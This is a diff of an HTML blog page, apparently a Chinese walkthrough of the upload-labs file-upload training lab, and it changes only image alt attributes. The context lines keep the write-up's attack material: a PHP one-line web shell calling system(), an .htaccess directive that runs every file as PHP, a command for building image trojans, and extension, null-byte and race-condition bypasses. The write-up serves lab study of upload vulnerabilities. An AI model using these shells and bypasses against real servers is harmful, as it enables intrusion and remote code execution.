@@ -132,10 +132,10 @@
             <h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>本关介绍两种解题方法：</p>
 <p><strong>方法一</strong></p>
 <p>直接上传<code>webshell.php</code>时，发现前端弹出警告。按<code>F12</code>查看，在<code>javascript</code>的<code>白名单</code>中添加<code>php</code>这个后缀，然后就可以直接上传成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/1-1.png" alt="1-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/1-1.png" alt></p>
 <p><strong>方法二</strong></p>
 <p>先将webshell的后缀改为<code>png（或者白名单中任意后缀）</code>，然后上传，<code>Burpsuit</code>将数据包进行修改，重新将文件后缀改为<code>.php</code>，绕过前端验证就可以</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/1-2.png" alt="1-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/1-2.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">function checkFile() {
     var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;
@@ -156,7 +156,7 @@
 }
 </code></pre>
 <h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>直接上传<code>.php</code>文件会提示<code>文件类型不正确，请重新上传！</code>。将文件后缀改为<code>.png</code>，抓包修改文件后缀为<code>.php</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/2-1.png" alt="2-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/2-1.png" alt></p>
 <p>直接上传成功，蚁剑连接成功</p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">$is_upload = false;
@@ -184,13 +184,13 @@ if (isset($_POST[&#39;submit&#39;])) {
 </blockquote>
 <p>直接上传<code>.php</code>文件会提示<code>不允许上传.asp,.aspx,.php,.jsp后缀文件！</code>。将文件后缀改为<code>.png</code>，和 Less-2 一样抓包修改文件后缀，还是出现同样的提示</p>
 <p>按照提示来看，应该是采用黑名单，那就用<code>.php3</code>试着绕过，发现上传成功（<code>php3</code>、<code>php5</code>、<code>phtml</code>）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/3-1.png" alt="3-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/3-1.png" alt></p>
 <p>但是这些后缀名我的蚁剑都不能连接，一句话内容更改为<code>代码执行</code>的命令时，也只有<code>phtml</code>能被解析</p>
 <pre><code class="php">&lt;?php 
 echo system($_GET[&#39;pass&#39;]);
 ?&gt;
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/3-2.png" alt="3-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/3-2.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">$is_upload = false;
 $msg = null;
@@ -227,15 +227,15 @@ if (isset($_POST[&#39;submit&#39;])) {
 <p>但是可以上传<code>.htaccess</code>，内容如下（该行代码的作用是使服务器将所有类型的文件都解析为php）</p>
 <pre><code class="php">SetHandler application/x-httpd-php
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/4-1.png" alt="4-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/4-1.png" alt></p>
 <blockquote>
 <p>在使用 .htaccess 之前，需要先开启对其的支持</p>
 <p>Linux：修改 /etc/apache2/apache2.conf 内的  AllowOverride 为 ALL（默认None）。然后重启 apache2 服务器</p>
 </blockquote>
 <p>上传成功后，我们上传一个大马，后缀随意</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/4-2.png" alt="4-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/4-2.png" alt></p>
 <p>成功上传并且可以解析连接</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/4-3.png" alt="4-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/4-3.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">$is_upload = false;
 $msg = null;
@@ -269,12 +269,12 @@ if (isset($_POST[&#39;submit&#39;])) {
 <p>shell.PHP、shell.PhP 等大小写</p>
 </blockquote>
 <p>先尝试前面的步骤，本关连<code>.htaccess</code>都无法上传，但是本关却可以通过大小写来绕过，尝试<code>.PHP</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/5-1.png" alt="5-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/5-1.png" alt></p>
 <p>尝试连接，成功</p>
 <blockquote>
 <p>注意：大写PHP后缀名的解析，同样只存在于部分版本的apache</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/5-2.png" alt="5-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/5-2.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">$is_upload = false;
 $msg = null;
@@ -308,14 +308,14 @@ if (isset($_POST[&#39;submit&#39;])) {
 <p>shell.php (+ 空格)</p>
 </blockquote>
 <p>本关弥补了前一关的缺陷，对后缀名用<code>strtolower()</code>函数处理，所以前一关大写的<code>PHP</code>会变为<code>php</code>，还在黑名单之内，所以无法绕过。但是本关可以利用<code>添加空格</code>绕过黑名单，因为<code>strrchr()</code>获取<code>.</code>之后的内容，当我们添加空格时，自然也会被获取，但是黑名单中并没有<code>后缀名+空格</code>的形式，所以匹配失败，上传成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/6-1.png" alt="6-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/6-2.png" alt="6-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/6-1.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/6-2.png" alt></p>
 <p>可以绕过，那现在就是试一下实际上传效果，并且看上传上去后，能不能被正常解析</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/6-3.png" alt="6-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/6-3.png" alt></p>
 <p>可以被正常解析</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/6-4.png" alt="6-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/6-4.png" alt></p>
 <p>在上传文件夹内查看文件名，发现<code>php</code>后面并没有<code>空格</code>，这说明 空格 可以帮助我们绕过黑名单，并且生成文件时没有被保存下来</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/6-5.png" alt="6-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/6-5.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">$is_upload = false;
 $msg = null;
@@ -349,11 +349,11 @@ if (isset($_POST[&#39;submit&#39;])) {
 <p>Windows 自动去掉文件名末尾的点</p>
 </blockquote>
 <p>本关弥补了前一关的缺陷，对后缀名用<code>trim()</code>函数处理，去掉了前后空格。但是本关相比前一关少了<code>deldot()</code>函数，没有对后缀中的<code>点(.)</code>进行删除，可以利用<code>Windows</code>的特性：<code>会自动去掉文件名末尾的点(.)</code>来绕过黑名单</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/7-1.png" alt="7-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/7-1.png" alt></p>
 <p>可以访问解析</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/7-2.png" alt="7-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/7-2.png" alt></p>
 <p>看一下文件名</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/7-3.png" alt="7-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/7-3.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">$is_upload = false;
 $msg = null;
@@ -391,11 +391,11 @@ if (isset($_POST[&#39;submit&#39;])) {
 </code></pre>
 <p>这个是关于 Windows 下备用数据流 ，可以参考一下这篇文章：<a href="https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream" target="_blank" rel="noopener">Windows ::DATA alternate data stream</a></p>
 <p>所以现在就可以利用这个来上传</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/8-2.png" alt="8-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/8-2.png" alt></p>
 <p>可以访问</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/8-1.png" alt="8-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/8-1.png" alt></p>
 <p>文件末尾自动去掉了<code>::$DATA</code>字符串</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/8-3.png" alt="8-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/8-3.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">$is_upload = false;
 $msg = null;
@@ -432,11 +432,11 @@ if (isset($_POST[&#39;submit&#39;])) {
 <pre><code class="php">move_uploaded_file($temp_file, $img_path)
 </code></pre>
 <p>可以使文件名为<code>shell.php. .（点+空格+点）</code>，这样<code>strrchr()</code>截取到的结果是<code>. + 空格</code>，不再黑名单内，然后上传的文件名为<code>shell.php.</code>，<code>Windows</code>的解析特性：末尾空格会忽略（这就与 Less-7 情况一样）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/9-1.png" alt="9-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/9-1.png" alt></p>
 <p>可以访问并解析</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/9-2.png" alt="9-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/9-2.png" alt></p>
 <p>但是不理解为什么末尾2个点中间要加空格，不加空格的话，strrchr() 函数截取到<code>.</code>，照样不在黑名单内</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/9-3.png" alt="9-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/9-3.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">$is_upload = false;
 $msg = null;
@@ -471,9 +471,9 @@ if (isset($_POST[&#39;submit&#39;])) {
 <p>str_replace() 函数匹配一次，双写绕过</p>
 </blockquote>
 <p>本关看到很熟悉的函数<code>str_ireplace()</code>，与<code>str_replace()</code>的区别就是大小写敏感，他们都只进行一次匹配，所以可以直接双写绕过</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/10-1.png" alt="10-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/10-1.png" alt></p>
 <p>可以访问并解析</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/10-2.png" alt="10-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/10-2.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">$is_upload = false;
 $msg = null;
@@ -503,11 +503,11 @@ if (isset($_POST[&#39;submit&#39;])) {
 <pre><code>php 版本低于 5.3.29
 php.ini 的 magic_quotes_gpc = Off
 </code></pre><p>文件上传的位置用了<code>$_GET[&#39;save_path&#39;]</code>，与文件后缀的检查分开了，所以我们可以通过控制<code>$_GET[&#39;save_path&#39;]</code>的值来控制文件名称，使用<code>%00</code>截断后面的其他内容，使得<code>$img_path</code>的值就只等于<code>$_GET[&#39;save_path&#39;]</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/11-1.png" alt="11-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/11-1.png" alt></p>
 <p>上传的文件名正常，如我们意料地被截断了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/11-3.png" alt="11-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/11-3.png" alt></p>
 <p>可以访问并解析</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/11-2.png" alt="11-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/11-2.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">$is_upload = false;
 $msg = null;
@@ -532,10 +532,10 @@ if(isset($_POST[&#39;submit&#39;])){
 <p>shell.php%00(urldecode)</p>
 </blockquote>
 <p>本关其他代码没变，只是<code>save_path</code>由<code>GET</code>变成了<code>POST</code>。方法还是一样，但是由于 POST 方式不会自动进行<code>URL解码</code>，</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/12-1.png" alt="12-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/12-1.png" alt></p>
 <p>所以需要将<code>%00</code>手动解码之后再放进去，否则会报错</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/12-2.png" alt="12-2"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/12-3.png" alt="12-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/12-2.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/12-3.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">$is_upload = false;
 $msg = null;
@@ -561,18 +561,18 @@ if(isset($_POST[&#39;submit&#39;])){
 <p>图片马制作：copy normal.jpg /b + shell.php /a shell.jpg</p>
 </blockquote>
 <p>出现了新的提示</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-1.png" alt="13-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-1.png" alt></p>
 <p>从源代码可以看出来，对文件的读取只读了<code>2个字节</code>，然后判断类型，并且将类型直接作为文件最后的后缀。这个就没办法绕过了，只能写进去图片马，找<code>include()</code>或者<code>解析漏洞</code>来用马。生成图片马：</p>
 <pre><code>copy normal.jpg /b + shell.php /a webshell.jpg
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-2.png" alt="13-2"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-2.png" alt></p>
 <p>然后上传</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-3.png" alt="13-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-3.png" alt></p>
 <p>我们在服务器内写一个能够<code>文件包含</code>的页面，模拟漏洞 本地文件包含 的漏洞（include 的文件都当做php文件来解析）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-4.png" alt="13-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-4.png" alt></p>
 <p>然后查看图片马的名称，并包含我们的图片马</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-5.png" alt="13-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-5.png" alt></p>
 <p>写一句话，然后菜刀连接</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-6.png" alt="13-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-6.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">function getReailFileType($filename){
     $file = fopen($filename, &quot;rb&quot;);
@@ -621,11 +621,11 @@ if(isset($_POST[&#39;submit&#39;])){
 <p>image_type_to_extension()</p>
 </blockquote>
 <p><code>getimagesize()</code>函数</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/14-1.png" alt="14-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/14-1.png" alt></p>
 <p><code>image_type_to_extension()</code>函数</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/14-2.png" alt="14-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/14-2.png" alt></p>
 <p>所以本关是通过<code>getimagesize()</code>获取到类型，上一关的方法还可以使用</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-6.png" alt="13-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-6.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">function isImage($filename){
     $types = &#39;.jpeg|.png|.gif&#39;;
@@ -664,9 +664,9 @@ if(isset($_POST[&#39;submit&#39;])){
 <p>exif_imagetype()</p>
 </blockquote>
 <p><code>exif_imagetype()</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/15-1.png" alt="15-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/15-1.png" alt></p>
 <p>同样用13、14关的方法</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-6.png" alt="13-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-6.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">function isImage($filename){
     //需要开启php_exif模块
@@ -711,9 +711,9 @@ if(isset($_POST[&#39;submit&#39;])){
 <p>本关可以参考超详细的文章： <a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">upload-labs之pass 16详细分析</a></p>
 <p>先判断文件是否是图片，如果是的话，进行二次渲染</p>
 <p>本关就无法使用前 3 关用的图片马了，因为关键的一句话会被去掉，先看一下前面使用的图片马一句话的位置</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-1.png" alt="16-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-1.png" alt></p>
 <p>可以看到一句话在文件末尾，即直接拼接在图片数据后面。将其上传，然后在服务器端看一下上传的图片马</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-2.png" alt="16-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-2.png" alt></p>
 <p>可以看到末尾关键的一句话已经被删掉了。那么本题的挺多种方法，一种方法就是自己去尝试，上传前的 图片马 与 被渲染之后的图片 哪部分相同，说明函数对那部分是不做修改处理，就可以在里面插入 一句话；另一种方法用大佬的脚本生成图片马</p>
 <p><strong>PNG</strong></p>
 <pre><code class="php">&lt;?php
@@ -740,9 +740,9 @@ imagepng($img,&#39;./1.png&#39;);
 ?&gt;
 </code></pre>
 <p>运行如上脚本获取PNG图片马</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-3.png" alt="16-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-3.png" alt></p>
 <p>成功上传，然后连接</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-4.png" alt="16-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-4.png" alt></p>
 <p>Ps：如报错<code>Call to undefined function imagecreatetruecolor()</code>，是因为没有开启php的gd库，Linux 安装即可，Windwos 去修改 php.ini</p>
 <pre><code>sudo apt-get install php-gd
 </code></pre><p><strong>JPG</strong></p>
@@ -917,10 +917,10 @@ imagepng($img,&#39;./1.png&#39;);
 ?&gt;
 </code></pre>
 <p>先上传一张 jpg 图片 到服务器上，然后将其下载下来（被服务器处理完了），然后用脚本处理它</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-5.png" alt="16-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-5.png" alt></p>
 <p>将处理完的图片上传，然后可以通过改变代码中的 payload 来执行不同的语句（后来发现这个代码无法处理太长的 payload和<code>$</code>符号，以及有些代码，只能看实际情况再调整了）</p>
 <pre><code>&lt;?=var_dump(getcwd());?&gt;
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-6.png" alt="16-6"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-6.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">$is_upload = false;
 $msg = null;
@@ -1012,9 +1012,9 @@ if (isset($_POST[&#39;submit&#39;])){
 <p>条件竞争</p>
 </blockquote>
 <p>上传一句话时抓包，然后在<code>Intruder-&gt;Payload Sets-&gt;Payload type</code>处设置<code>Null payloads</code>，因为我们是重发数据包，没有要改变的 payload。然后设置重发次数，点击<code>Start attack</code>开始重发</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/17-1.png" alt="17-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/17-1.png" alt></p>
 <p>在重发的时候浏览器多次访问<code>shell</code>，就可以获取到</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/17-2.png" alt="17-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/17-2.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">$is_upload = false;
 $msg = null;
@@ -1168,11 +1168,11 @@ class MyUpload{
 <p>move_uploaded_file() 的 %00 截断（CVE-2015-2348）</p>
 </blockquote>
 <p>源码中看到<code>move_uploaded_file()</code>直接使用了我们<code>$_POST[&#39;save_name&#39;]</code>，所以思路从这里入手，想到了<code>%00</code>截断。然后利用<code>pathinfo()</code>处理的后缀，绕过黑名单</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/19-1.png" alt="19-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/19-1.png" alt></p>
 <p>加上<code>%00</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/19-2.png" alt="19-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/19-2.png" alt></p>
 <p>可以访问并解析</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/19-3.png" alt="19-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/19-3.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">$is_upload = false;
 $msg = null;
@@ -1205,18 +1205,18 @@ if (isset($_POST[&#39;submit&#39;])) {
 </blockquote>
 <p>本道题在代码在<code>2019 unctf</code>的<code>simple_upload</code>出现了，关键在于<code>end()、reset()、count()</code>函数处理的不当，导致绕过。</p>
 <p>先做个简单测试</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/5-1.png" alt="5-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/5-1.png" alt></p>
 <p>这题的关键点在于<code>move_uploaded_file()</code>函数会自动递归删除最后的<code>/.</code>字符串（或者 Windows 环境下自动删除文件名最后的<code>.</code>）</p>
 <pre><code class="php">move_uploaded_file($temp_name, $img_path)
 </code></pre>
 <p>当我们有传入<code>$_POST[&#39;save_name&#39;]</code>时，并且是一个数组，<code>$file</code>这个变量就可以是一个数组，并且内容随意控制，无需受<code>explode()</code>控制，思路：</p>
 <p>① 令数组的最后一个参数为允许的后缀，比如 png</p>
 <p>② 令<code>$file[count($file) - 1]</code>为空，这样<code>$file_name</code>等于“数组的第一位 + <code>.</code>”，然后我们使数组的第一位为“文件名 + <code>/</code>”，这样传入 move_uploaded_file() 函数中时，就是“文件名 + <code>/.</code>”，后面的<code>/.</code>就会被处理掉。看一下 count() 对数组处理的漏洞，对没有赋值的数组元素不计算，所以可以利用这一点来使得<code>$file[count($file) - 1]</code>为空</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/5-3.png" alt="5-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/5-3.png" alt></p>
 <p>以上是一种处理方法，如果面对的服务器是搭建在 Windwos 上的，我们可以忽略<code>/</code>，因为 Windwos 本来就会处理掉文件最后面的<code>.</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/20-1.png" alt="20-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/20-1.png" alt></p>
 <p>可以访问并解析</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/20-2.png" alt="20-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/20-2.png" alt></p>
 <p><strong>核心代码</strong></p>
 <pre><code class="php">$is_upload = false;
 $msg = null;
